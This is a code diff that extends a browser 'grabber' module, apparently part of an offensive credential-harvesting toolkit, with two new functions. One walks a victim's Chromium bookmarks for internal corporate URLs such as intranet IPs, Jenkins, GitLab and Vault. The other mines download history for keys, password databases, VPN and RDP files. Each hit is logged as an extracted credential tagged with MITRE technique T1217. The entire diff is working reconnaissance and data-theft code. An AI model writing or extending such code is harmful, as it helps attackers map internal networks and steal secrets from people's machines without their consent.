@@ -93,6 +93,14 @@ class BrowserGrabber(GrabberModule):
                     ext_data = self._extract_chromium_extensions(profile_path, browser_name)
                     result.credentials.extend(ext_data)
 
+                    # Bookmarks (reveals internal portals and URLs)
+                    bookmarks = self._extract_chromium_bookmarks(profile_path, browser_name)
+                    result.credentials.extend(bookmarks)
+
+                    # Download history (reveals tools and documents)
+                    downloads = self._extract_chromium_downloads(profile_path, browser_name)
+                    result.credentials.extend(downloads)
+
                 if result.credentials:
                     login_count = len([c for c in result.credentials
                                        if c.target_application.startswith(browser_name)
@@ -453,6 +461,99 @@ class BrowserGrabber(GrabberModule):
             except Exception as e:
                 self.logger.debug(f"Autofill extraction failed: {e}")
 
+        finally:
+            safe_sqlite_close(conn, tmp_path)
+
+        return creds
+
+    def _extract_chromium_bookmarks(self, profile_path: str,
+                                     browser_name: str) -> list[ExtractedCredential]:
+        """Extract bookmarks that reveal internal infrastructure."""
+        creds = []
+        bookmarks_path = os.path.join(profile_path, "Bookmarks")
+        content = safe_read_text(bookmarks_path)
+        if not content:
+            return creds
+
+        try:
+            data = json.loads(content)
+
+            def walk_bookmarks(node):
+                if isinstance(node, dict):
+                    if node.get("type") == "url":
+                        url = node.get("url", "")
+                        name = node.get("name", "")
+                        # Flag internal/corp URLs
+                        if any(kw in url.lower() for kw in (
+                            ".internal", ".corp", ".local", "intranet",
+                            "10.", "172.16", "172.17", "172.18", "172.19",
+                            "172.2", "172.3", "192.168", "admin", "portal",
+                            "jenkins", "gitlab", "jira", "confluence",
+                            "grafana", "kibana", "splunk", "vault",
+                        )):
+                            creds.append(ExtractedCredential(
+                                source_module=self.name,
+                                credential_type="token",
+                                target_application=f"{browser_name} (bookmark)",
+                                url=url,
+                                username=name,
+                                notes="Internal/infrastructure bookmark",
+                                mitre_technique="T1217",
+                                source_file=bookmarks_path,
+                            ))
+                    for v in node.values():
+                        walk_bookmarks(v)
+                elif isinstance(node, list):
+                    for item in node:
+                        walk_bookmarks(item)
+
+            walk_bookmarks(data)
+        except (json.JSONDecodeError, KeyError):
+            pass
+
+        return creds[:50]  # Cap at 50 bookmarks
+
+    def _extract_chromium_downloads(self, profile_path: str,
+                                     browser_name: str) -> list[ExtractedCredential]:
+        """Extract download history for intelligence on tools/docs used."""
+        creds = []
+        history_db = os.path.join(profile_path, "History")
+
+        result = safe_sqlite_read(history_db)
+        if not result:
+            return creds
+
+        conn, tmp_path = result
+        try:
+            cursor = conn.execute(
+                "SELECT target_path, tab_url, total_bytes FROM downloads "
+                "ORDER BY start_time DESC LIMIT 50"
+            )
+            for row in cursor:
+                target = row["target_path"] or ""
+                url = row["tab_url"] or ""
+                size = row["total_bytes"] or 0
+                fname = os.path.basename(target) if target else ""
+
+                # Flag interesting downloads
+                interesting_exts = (
+                    ".exe", ".msi", ".ps1", ".bat", ".vbs", ".hta",
+                    ".kdbx", ".key", ".pem", ".pfx", ".ovpn",
+                    ".rdp", ".rdg", ".sql", ".bak", ".zip", ".7z",
+                )
+                if fname and any(fname.lower().endswith(ext) for ext in interesting_exts):
+                    creds.append(ExtractedCredential(
+                        source_module=self.name,
+                        credential_type="token",
+                        target_application=f"{browser_name} (download)",
+                        url=url,
+                        username=fname,
+                        notes=f"size={size:,} bytes",
+                        mitre_technique="T1217",
+                        source_file=history_db,
+                    ))
+        except Exception:
+            pass
         finally:
             safe_sqlite_close(conn, tmp_path)
 
